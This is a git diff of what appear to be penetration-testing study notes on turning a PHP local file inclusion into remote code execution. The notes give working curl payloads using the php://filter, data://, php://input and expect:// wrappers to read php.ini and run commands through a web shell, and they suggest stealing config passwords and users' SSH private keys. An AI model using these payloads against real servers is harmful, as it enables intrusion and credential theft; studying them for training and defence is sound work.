@@ -334,3 +334,76 @@ php://filter/read=convert.base64-encode/resource=config
 
 remember that in this scenario the extension is automatically added on 
 
+## PHP Wrappers 
+
+now we will focus on gaining RCE   
+
+one easy way to gain control over the backend server is enumerate user credentials and SSH keys and use them to login   
+for example we may find the db password in a file like config.php which might also be the same password used for a user's account   
+can also check the .ssh directory in each user's home directory and if the read privileges aren't set right then we could grab their private key id_rsa and use it to ssh to the system 
+
+there are other ways to achieve RCE directly through the vulnerable function without relying on data enumeration or local file privileges   
+
+### Data 
+
+the `data` wrapper can be used to include external data, including PHP code   
+only available to use if the `allow_url_include` setting is enabled 
+
+we can check the configs file found at `/etc/php/X.Y/apache2/php.ini` for apache or `/etc/php/X.Y/fpm/php.ini` for nginx   
+`X.Y` = the PHP version   
+we will also use the base64 filter because .ini files are like .php files and should be encoded to avoid breaking 
+
+```shell
+curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
+```
+
+we can then take the base64 encoded results and decode them to look for the `allow_url_include` setting: 
+
+```shell
+echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
+```
+
+![](Images/Pasted%20image%2020240229091750.png)
+
+now we know that we can use the `data` wrapper, and remember that this is not set by default but is required for several other LFI attacks   
+it is not uncommon to see this setting set because it is required by many functionalities
+
+we can now combine the `data` wrapper with base64 using `text/plain;base64`  
+
+first we base64 encode a basic PHP shell: 
+
+![](Images/Pasted%20image%2020240229092125.png)
+
+which we can then url encode and use with the base64 data wrapper to execute commands: 
+
+```shell
+curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,<base64 encoded web shell>&cmd=id' | grep uid
+```
+
+### Input 
+
+similar to the `data` wrapper the `input` wrapper can be used to include external input and execute php code   
+the difference is that we pass our input to the `input` wrapper as a POST request's data, so the vulnerable parameter must accept POST requests for this to work   
+the `input` wrapper also depends on the `allow_url_include` to be enabled 
+
+```shell
+curl -s -X POST --data '<php web shell>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
+```
+
+with our previous shell, in order to pass our command as a GET request we need the vulnerable function to also accept GET requests, if it only accepts POST requests then we can put our command directly in our PHP code with something like `<\?php system('id')?>`
+
+### Expect 
+
+the `expect` wrapper also allows us to directly run commands through URL streams   
+works similar to the other shells we've used but we don't need to provide a web shell because it is designed to execute commands 
+
+`expect` is an external wrapper though so it needs to be manually installed and enabled on the backend server, but some apps rely on it so we may find it in some cases   
+
+we can do the same search we did with `allow_url_include` but instead grep for `expect` and we should find `extension=expect`
+
+all we need to do with this is pass the `expect://` wrapper and pass the command we want to execute: 
+
+```shell
+curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
+```
+
